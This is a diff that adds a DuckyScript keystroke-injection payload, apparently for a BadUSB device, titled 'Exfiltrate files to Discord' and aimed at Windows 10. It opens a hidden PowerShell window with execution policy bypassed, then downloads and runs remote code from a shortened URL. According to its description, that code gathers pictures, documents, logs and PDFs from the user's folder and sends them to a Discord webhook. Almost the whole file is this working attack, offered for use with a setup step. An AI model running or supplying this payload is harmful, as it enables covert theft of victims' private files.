@@ -1,0 +1,19 @@
+
+REM Title: beigeworm's Exfiltrate files to Discord
+REM Author: @beigeworm
+REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a Discord Webhook.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace WEBHOOK_HERE with your Discord Webhook.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://is.gd/bw_ex_to_dc | iex
+ENTER
+
